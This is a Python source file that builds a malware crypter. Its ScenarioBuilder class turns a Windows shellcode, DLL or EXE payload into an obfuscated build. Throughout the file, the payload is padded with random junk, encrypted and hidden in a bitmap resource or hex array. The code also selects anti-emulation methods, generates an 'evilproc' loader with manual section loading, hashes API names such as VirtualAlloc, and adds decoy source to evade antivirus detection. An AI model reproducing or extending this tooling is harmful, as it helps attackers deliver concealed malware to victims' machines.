from c2.config import PY_M
from c2._internal_config import get_cppbuild_dir
from c2._scenario import Scenario
from c2.common.sx import Sx


# Detail of class Cryptor
class ScenarioBuilder:
  def __init__(self,
               scenario:Scenario,  # output
               pay_info:dict,
               crp_opts:dict,
               sys_opts:dict,
               file_path):
    self.scenario = scenario
    self.pay_info = pay_info
    self.crp_opts = crp_opts
    self.sys_opts = sys_opts
    self.file_path = file_path
    #self._scenbuilder_opts = None

  def build(self):
    s = self.scenario

    ########################################
    s.add_stage('$initial')
    s.add_cmd(r'call $(Tools)\create_seed_file.py --if_not_exist  -o @\seedfile'
              r' -s  bh cb mdf sg gds ar rsg trs grb cpd evp')
    s.add_cmd(r'rmdir @\include_spraygen || cd.')
    s.add_cmd(r'mklink /j @\include_spraygen $(Sprayer)\include')

    ########################################
    s.add_stage('$create_payload')
    pi = self.pay_info
    crpo = self.crp_opts
    syso = self.sys_opts
    #_arch = pi['bin_arch']
    if pi['cpu'] == 'intel86':
      archn = '86'
      vs_plat = 'Win32'
    elif pi['cpu'] == 'intel64':
      archn = '64'
      vs_plat = 'x64'
    else:
      raise RuntimeError('cpu: only `intel86` and `intel64` is(are) supported')

    # #Security - crpo["soi_mul_percent_sx"] inserted to cmdline, but validated in validate_crp_opts; validate it again for fun
    Sx(crpo['soi_mul_percent_sx']).make_number() # probe
    file_path = self.file_path
    if pi['bin_type'] == 'win_shellcode':
      s.add_cmd(r'call $(Tools)\create_payload_default.py -b @\emptyfile.bin -p '+file_path+r' -o @\payload.bin'
                r' --seed_file @\seedfile --seed_section cpd')
    elif pi['bin_type'] == 'win_dll':
      ##obsolete:s.add_cmd(fr'call $(CrRoot)\{get_cppbuild_dir()}\p2gen{archn}\Release\{vs_plat}\p2gen{archn}.exe gen-mz @\p2code{archn}_trash.bin')

      s.add_cmd(fr'call $(Tools)\gen_rand_buf.py -o @\p2code{archn}_trash.bin -l 30000..60000 --seed_file @\seedfile --seed_section grb')
      s.add_cmd(fr'call $(Tools)\create_payload_default.py -b {file_path} -p @\p2code{archn}_trash.bin -o @\payload.bin'
                fr' --soi_mul_percent_sx {crpo["soi_mul_percent_sx"]}'
                r' --seed_file @\seedfile --seed_section cpd')
    elif pi['bin_type'] == 'win_exe':
      ##obsolete:s.add_cmd(fr'call $(CrRoot)\{get_cppbuild_dir()}\p2gen{archn}\Release\{vs_plat}\p2gen{archn}.exe gen-mz @\p2code{archn}_trash.bin')

      s.add_cmd(fr'call $(Tools)\gen_rand_buf.py -o @\p2code{archn}_trash.bin -l 30000..60000 --seed_file @\seedfile --seed_section grb')
      s.add_cmd(fr'call $(Tools)\create_payload_default.py -b {file_path} -p @\p2code{archn}_trash.bin -o @\payload.bin'
                fr' --soi_mul_percent_sx {crpo["soi_mul_percent_sx"]}'
                r' --seed_file @\seedfile --seed_section cpd')
    else:
      raise RuntimeError(f'unknown pay_info[\'bin_type\'] - {pi["bin_type"]}')

    _paytype_defs = []
    if pi['bin_type'] == 'win_shellcode':
      _paytype_defs += ['-DPAYLOAD_SHELLCODE']
    elif pi['bin_type'] == 'win_dll':
      _paytype_defs += ['-DPAYLOAD_DLL']
    elif pi['bin_type'] == 'win_exe':
      _paytype_defs += ['-DPAYLOAD_EXE']

    # Important to remember: to specify PRESENT, BUT EMPTY *_args in cmd line, use --pay_xxx_args " "
    _pfn_decl_args = pi["postfn_decl_args"].replace('`', '\\\"')
    _pfn_dllcall_args = pi["postfn_fromdll_call_args"].replace('`', '\\\"')
    _pfn_execall_args = pi["postfn_fromexe_call_args"].replace('`', '\\\"')
    s.add_cmd(
      fr'call $(Tools)\c_defs.py -DPAYLOAD_X{archn} -o @\payload.info.h' +
      (f' {" ".join(_paytype_defs)}') +
      (' -DEVIL_FROM_DLLMAIN ' if pi['dll_evil_from_dllmain'] else '') +
      (f' -DPOSTFN_RVA={pi["postfn_rva"]}' if pi['postfn_rva'] != '' else '') +
      (f' -DPOSTFN_DECL_ARGS="{_pfn_decl_args}"' if _pfn_decl_args != '' else '') +
      (f' -DPOSTFN_FROMDLL_CALL_ARGS="{_pfn_dllcall_args}"' if _pfn_dllcall_args != '' else '') +
      (f' -DPOSTFN_FROMEXE_CALL_ARGS="{_pfn_execall_args}"' if _pfn_execall_args != '' else '')
      )

    ### $exports
    # pi['xxx_yyy_args'] and other pay_info opts have their own 'pattern' regex in schema
    # so they are treated already validated. check test_opt_validation.py #SecurityLogic
    # We need "" in export_def_call_args: for example, 0, "" so we introduce character `.
    # Replace ` to \"  Why is it ok with security? because pay_info can't escape the ` -> ^" replacing: its charset is very limited and it doesn't have things to break syntax like ^ and \
    _libname = '$randstr$'
    _export_decl_args = pi["export_decl_args"].replace('`', '\\\"')
    _export_def_call_args = pi["export_def_call_args"].replace('`', '\\\"')
    _export_name = pi['export_name'] if pi['export_name'] != '' else '$randstr$'
    s.add_stage('$exports', [
      fr'call $(Tools)\c_defs.py -DEXPORT_DECL_ARGS="{_export_decl_args}" -DEXPORT_DEF_CALL_ARGS="{_export_def_call_args}" -o @\exports.h',
      fr'call $(Tools)\mod_def_file.py -l {_libname} -e {_export_name}=EvilProc -o @\module.def --seed_file @\seedfile --seed_section mdf'
    ])


    _ea = []
    if crpo['rearrange']:
      _ea += ['-r']

    s.add_stage('$encrypt_payload', [
      r'call $(Tools)\cryptbin.py -x 0 -k 0 -i @\payload.bin -o @\payload.cryptbin.bin -e @\cryptbin.keys.h'
      f' {" ".join(_ea)}'
      r' --tail_count 1 --tail_key 0'  # tail is dwCachedSizeOfImage
      r' --seed_file @\seedfile --seed_section cb',
    ])



    s.add_stage('$construct_parts')

    store_method = crpo['store_method']
    assert(store_method == 'binhex' or store_method == 'resource')

    alloc_method = crpo['alloc_method']
    assert(alloc_method == 'valloc' or alloc_method == 'halloc')# or alloc_method == 'dllhollow')

    AE = crpo['ae_method']
    assert(AE == 'xxx' or AE == 'wnd')
    DECRYPT = 'cryptbin'
    #s.add_cmd(r'call $(Tools)\make_part_info_defs.py  -p antiemu locate decrypt alloc  -o @\src\PART_INFO_DEFS.h')
    _ea = ['--ldr'] if pi['bin_type'] != 'win_shellcode' else []
    s.add_cmd(fr'call $(Tools)\construct.py  -a {AE} -l {store_method} -d {DECRYPT}'
              fr' -z {alloc_method} -o @ {" ".join(_ea)}')
    s.add_cmd(r'call $(Tools)\make_part_info_defs.py  -l @\src\parts.lst  -o @\src\PART_INFO_DEFS.h')
    s.add_cmd(fr'call $(CrRoot)\reskit\resput.py -c -o @\rsrc  --seed_file @\seedfile --seed_section rsg')
    


    s.add_stage('$construct_extra')
    _eastr = ''
    if crpo['no_spread_section_load']:
      _eastr += '-CLDR_MANUAL_SECTION_LOAD '
    else:
      _eastr += '-DLDR_MANUAL_SECTION_LOAD '
    if crpo['fixup_tls_pointer']:
      _eastr += '-DLDR_FIXUP_TLS_POINTER ' # maybe this is just a workaround for some 'forgot-some-relocs'-bug in basereloc processing code
    s.add_cmd(fr'call $(Tools)\c_defs.py {_eastr} -o @\src\PART_DEFS.h')

    _ea = ['--no_spread_section_load'] if crpo['no_spread_section_load'] else []
    if pi['bin_type'] != 'win_shellcode':
      _ea += ['--pe', file_path]

    _ea2 = []
    if crpo['alloc_method'] != 'valloc':
      #
      # #InterfereTheConfig
      # For non-valloc alloc methods, OVERRIDE initial_prots with the only possible 'rw'
      # #Future: what to do when using dllhollow method?
      #
      _ea2 += ['--opts_protlogic_initial_prots', 'rw']

    s.add_cmd(r'$(CrRoot)\evp\evpgen.py -t $(CrRoot)\cpp_parts\EVILPROC_TEMPLATE.cpp -o @\src\evilproc.cpp_'
              fr' --opts @\evp_opts.json'
              fr' --bin_type {pi["bin_type"]}'
              fr' --seed_file @\seedfile --seed_section evp'
              fr' {" ".join(_ea)}'
              fr' {" ".join(_ea2)}')
    program = crpo['program']
    if program == 'static_min':
      s.add_cmd(r'ren @\src\evilproc.cpp_ evilproc.cpp')
    elif program == 'proggen':
      raise RuntimeError('something like py -m c2.crp.pg.proggen --uscan --template @\src\evilproc.cpp_ -o @\src\evilproc.cpp')
    else: raise RuntimeError(f'unknown {program=}')



    s.add_stage('$postprocess_payload')
    if store_method == 'binhex':
      s.add_cmd(r'call $(Tools)\binhex_facade.py -i @\payload.cryptbin.bin -o @\payload.binhex.h --name payload')
    elif store_method == 'resource':
      s.add_cmd(r'copy /y NUL @\res.info.h') #we're -a(ppending) to it, need to clear
      s.add_cmd(r'call $(Tools)\bin2media.py -e -c bmp -a @\res.info.h -i @\payload.cryptbin.bin -o @\payload.cryptbin.bmp')
      s.add_cmd(r'call $(Tools)\addresource.py -t BITMAP -i @\payload.cryptbin.bmp -a @\res.info.h -d @\rsrc --seed_file @\seedfile --seed_section ar')
    else: raise RuntimeError(f'unknown {store_method=}')


    _, __ = crpo['num_cpp_decays_sx'], crpo['num_c_decays_sx']
    s.add_stage('$finalize')
    s.add_cmd(r'call $(Tools)\strhash.py -m 31 -s VirtualAlloc -s VirtualFree -s VirtualProtect -s LoadLibraryExA -o @\string_hashes.h')
    s.add_cmd(r'call $(Tools)\gen_decay_src.py -o @\src_decay --cpp_count_sx {} --c_count_sx {}'.format(_, __)+' --seed_file @\seedfile --seed_section gds')

    _eastr = ''
    if syso['portable_binhide']:
      _eastr += '--portable '
    s.add_cmd(fr'call $(Tools)\create_binhide_bat_file.py {_eastr} -o @')



    s.add_stage('$spray_prepare')
    s.add_cmd(PY_M + r'c2.sprayer.spraytab'
                     r' -z @\gened_headers.h -d @\src\ -o @'
                     r' -X @\res.info.h'
                     r' -X @\cryptbin.keys.h -X @\payload.info.h -X @\src\evil_common.h -X @\src\PART_INFO_DEFS.h'
                     r' -X @\src\PART_DEFS.h'
                     r' --allow_nonexisting')

    if crpo['trasher_enabled']:
      s.add_cmd(PY_M+r'c2.trasher.trash_add -i @\spraytab.json -o @\spraytab.json'
                     r' --opts @\trasher_opts.json --seed_file @\seedfile --seed_section trs')

    s.add_cmd(PY_M + r'c2.sprayer.spraygen -j @\spraytab.json --opts @\spraygen_opts.json -o @'
                     r' --seed_file @\seedfile --seed_section sg')


    s.add_stage('$done', [
      r'call $(Tools)\make_outdata.py @'
    ])




